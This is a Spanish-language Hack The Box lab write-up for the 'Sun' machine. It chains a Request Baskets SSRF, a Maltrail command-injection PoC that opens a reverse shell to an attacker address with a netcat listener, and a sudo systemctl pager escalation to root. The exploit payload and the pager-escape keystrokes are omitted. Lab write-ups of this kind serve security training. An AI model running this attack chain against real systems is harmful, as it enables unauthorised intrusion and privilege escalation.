# Sun — Hack The Box Write-up

- **Autor:** Alex09060
- **Plataforma:** Hack The Box
- **Dificultad:** Easy.
- **Sistema operativo:** Linux.
- **IP de la máquina en las evidencias:** `10.129.229.26`

> **Aviso:** Write-up elaborado a partir de los apuntes y capturas facilitados. Los comandos y resultados se reproducen cuando son legibles en las evidencias. Los datos que no aparecen documentados se indican como pendientes, en lugar de completarlos mediante suposiciones.

## Resumen

La máquina **Sun** se compromete encadenando dos vulnerabilidades y una configuración de `sudo` permisiva:

1. Un servicio Request Baskets 1.2.1 expuesto en el puerto `55555` permite configurar una cesta como proxy hacia un servicio HTTP local. Esta funcionalidad se utiliza para alcanzar una instancia de Maltrail.
2. La instancia identificada como Maltrail 0.53 es vulnerable a ejecución remota de comandos sin autenticación (CVE-2025-34073). Se utiliza el PoC de [Hummingbird-Maltrail-RCE](https://github.com/SethJGibson/Hummingbird-Maltrail-RCE-PoC) para obtener una shell inversa como `puma`.
3. El usuario `puma` puede ejecutar `systemctl status trail.service` como root sin contraseña. El paginador invocado por `systemctl` permite aprovechar la vulnerabilidad de systemd asociada a CVE-2023-26604 y conseguir una shell privilegiada.

Las capturas originales que muestran los valores de `user.txt` y `root.txt` no se incluyen en las referencias visuales de este documento para evitar publicar las flags.

## 1. Enumeración

### 1.1. Escaneo de puertos

Se realiza un escaneo TCP SYN de todos los puertos, con una tasa mínima de 4000 paquetes por segundo y guardando el resultado en formato grepable:

```bash
sudo nmap -p- -sS --min-rate 4000 10.129.229.26 -oG ports
```

El resultado visible en la captura es:

| Puerto | Estado | Servicio identificado por Nmap |
|---|---|---|
| `22/tcp` | open | ssh |
| `80/tcp` | filtered | http |
| `8338/tcp` | filtered | unknown |
| `55555/tcp` | open | unknown |

Por tanto, los únicos puertos que aparecen como **abiertos** en esta evidencia son `22/tcp` y `55555/tcp`. Los puertos `80/tcp` y `8338/tcp` aparecen filtrados; no deben describirse como abiertos.

![Escaneo inicial de Nmap](img/01.png)

### 1.2. Enumeración del servicio web

Al acceder al servicio del puerto `55555` se encuentra la interfaz **Request Baskets**. El pie de página de la aplicación muestra la versión **1.2.1**.

![Interfaz de Request Baskets](img/02.png)

La versión 1.2.1 está afectada por **CVE-2023-27163**, una vulnerabilidad SSRF en Request Baskets. La descripción de MITRE indica que el endpoint `/api/baskets/{name}` puede utilizarse para acceder a recursos de red y obtener información sensible.

Referencia: [CVE-2023-27163 — MITRE](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2023-27163).

## 2. Acceso inicial

### 2.1. Creación y configuración de la cesta

Se crea una cesta con el nombre `ssrf` desde la interfaz web.

![Creación de la cesta ssrf](img/03.png)

En la configuración de la cesta se observa la siguiente configuración:

- **Forward URL:** `http://127.0.0.1:80`
- **Proxy Response:** activado.
- **Expand Forward Path:** activado.
- **Basket Capacity:** `200`.

Esta configuración hace que las peticiones recibidas por la cesta se reenvíen al servicio HTTP local indicado en `Forward URL`, y que la respuesta del destino se devuelva al cliente. Así se alcanza el servicio local a través de Request Baskets.

![Configuración SSRF de Request Baskets](img/04.png)

Al visitar la cesta a través de la ruta `/ssrf`, se obtiene la página del servicio interno. En ella se identifica una instancia de **Maltrail versión 0.53**.

### 2.2. Explotación de Maltrail

La versión observada de Maltrail es vulnerable a **CVE-2025-34073**, una vulnerabilidad de inyección de comandos no autenticada. La ficha de INCIBE describe la ejecución de comandos mediante el parámetro `username` de una petición POST al endpoint `/login`; los comandos se ejecutan con los privilegios del proceso Maltrail.

Referencia: [CVE-2025-34073 — INCIBE](https://www.incibe.es/en/incibe-cert/early-warning/vulnerabilities/cve-2025-34073).

Para explotar el servicio se utiliza el PoC publicado en el repositorio [SethJGibson/Hummingbird-Maltrail-RCE-PoC](https://github.com/SethJGibson/Hummingbird-Maltrail-RCE-PoC).

La captura muestra la ejecución del script con estos argumentos:

```bash
python3 exploit.py 10.10.14.111 443 http://10.129.229.26:55555/ssrf/
```

- `10.10.14.111`: dirección IP de la máquina atacante indicada en la evidencia.
- `443`: puerto de escucha indicado para la conexión inversa.
- `http://10.129.229.26:55555/ssrf/`: URL de la cesta configurada.

El script muestra varios avisos `SyntaxWarning` relacionados con secuencias de escape en cadenas de texto. La captura termina mostrando `Executing exploit...`; no se modifica el comando original.

![Ejecución del PoC de Maltrail](img/05.png)

### 2.3. Recepción de la shell

En otra terminal se inicia un listener de Netcat:

```bash
sudo nc -nvlp 443
```

La captura muestra una conexión entrante desde `10.129.229.26` al puerto `34016` de la máquina atacante. La shell indica que no dispone de una TTY:

```text
/bin/sh: 0: can't access tty; job control turned off
```

![Conexión inversa recibida](img/06.png)

Los apuntes originales indican que después se realizó el tratamiento habitual de la TTY, pero no incluyen el comando exacto utilizado. Por ese motivo no se añade una secuencia de comandos genérica como si formara parte de la evidencia.

## 3. Acceso como usuario

Tras obtener la shell, el usuario identificado es `puma`. La captura muestra que se accede al directorio personal `/home/puma` y se ejecuta `cat user.txt`.

No se reproduce el contenido de la flag.

> **Evidencia omitida:** la captura original de esta fase contiene el valor de `user.txt`. Se omite su inserción para no divulgar la flag.

## 4. Escalada de privilegios

### 4.1. Enumeración de permisos sudo

Desde la shell de `puma` se ejecuta:

```bash
sudo -l
```

La salida indica que `puma` puede ejecutar el siguiente comando como cualquier usuario y grupo, sin contraseña:

```text
(ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```

![Permisos sudo del usuario puma](img/07.png)

### 4.2. Identificación de la versión de systemd

Se consulta la versión de systemd:

```bash
systemctl --version
```

La captura muestra:

```text
systemd 245 (245.4-4ubuntu3.22)
```

![Versión de systemd](img/08.png)

### 4.3. Abuso del paginador de systemctl

La ejecución de `systemctl status` puede abrir la salida mediante un paginador, como `less`. En la configuración vulnerable descrita por **CVE-2023-26604**, el paginador puede heredar un entorno que permite escapar a una shell.

Como `puma` tiene permiso para ejecutar `systemctl status trail.service` como root sin contraseña, se utiliza ese comando como vía para activar el paginador con privilegios elevados:

```bash
sudo systemctl status trail.service
```

La captura de la salida muestra el servicio `trail.service` activo, el proceso de Maltrail y el paginador `pager` al final del árbol de procesos. La evidencia posterior muestra un prompt `root@sau` y la lectura de `/root/root.txt`, lo que confirma que se obtuvo acceso como root.

Referencia: [CVE-2023-26604 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2023-26604).

> **Limitación de la evidencia:** los apuntes explican que se escapa del paginador `less`, pero no conservan el atajo o la secuencia exacta de teclas utilizada. No se inventa ese paso.

La captura original de la comprobación de root también contiene el valor de `root.txt`; por seguridad, no se inserta en el README.

## 5. Conceptos clave

- **Enumeración de puertos con Nmap:** identificación de servicios expuestos y diferenciación entre puertos abiertos y filtrados.
- **SSRF (Server-Side Request Forgery):** uso de Request Baskets para hacer que el servidor solicite un recurso local (`127.0.0.1:80`) y devuelva la respuesta.
- **Inyección de comandos:** explotación de Maltrail 0.53 mediante CVE-2025-34073 para ejecutar comandos sin autenticación.
- **Shell inversa:** establecimiento de una conexión desde la máquina comprometida hacia un listener controlado por el atacante.
- **Enumeración de sudo:** detección de comandos que un usuario puede ejecutar con privilegios elevados mediante `sudo -l`.
- **Abuso del paginador:** aprovechamiento de la ejecución de `systemctl status` y del paginador para obtener una shell privilegiada, relacionado con CVE-2023-26604.

## 6. Referencias

- [Hack The Box — plataforma](https://www.hackthebox.com/)
- [CVE-2023-27163 — MITRE: Request Baskets SSRF](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2023-27163)
- [CVE-2025-34073 — INCIBE: Maltrail command injection](https://www.incibe.es/en/incibe-cert/early-warning/vulnerabilities/cve-2025-34073)
- [PoC — Hummingbird-Maltrail-RCE](https://github.com/SethJGibson/Hummingbird-Maltrail-RCE-PoC)
- [CVE-2023-26604 — NVD: systemd](https://nvd.nist.gov/vuln/detail/CVE-2023-26604)

## Notas de verificación

- La dificultad oficial de la máquina no aparece en los materiales proporcionados y queda pendiente de confirmar en la ficha de HTB.
- El sistema operativo se identifica como Linux, pero las capturas no muestran una ficha oficial ni una identificación completa de la distribución de la máquina. La versión de systemd observada es `245.4-4ubuntu3.22`.
- El escaneo aportado muestra `22/tcp` y `55555/tcp` abiertos; `80/tcp` y `8338/tcp` aparecen filtrados. No se dispone de una captura de un escaneo de versiones (`-sV`) que permita atribuir versiones a SSH u otros servicios.
- La versión de Request Baskets (`1.2.1`) se lee en el pie de página de la aplicación. La versión de Maltrail (`0.53`) aparece en los apuntes, pero no hay una captura independiente de su número de versión.
- La explotación de Maltrail se atribuye a CVE-2025-34073 de acuerdo con la referencia externa. La evidencia de la máquina muestra el uso del PoC, pero no conserva la petición HTTP interna que construye el exploit.
- Los comandos exactos para el tratamiento de la TTY y la salida del paginador no están presentes en las capturas; se han dejado expresamente sin completar.
- Las capturas que contienen los valores de `user.txt` y `root.txt` deben mantenerse fuera de la publicación o editarse para ocultar las flags antes de incorporarlas al repositorio.
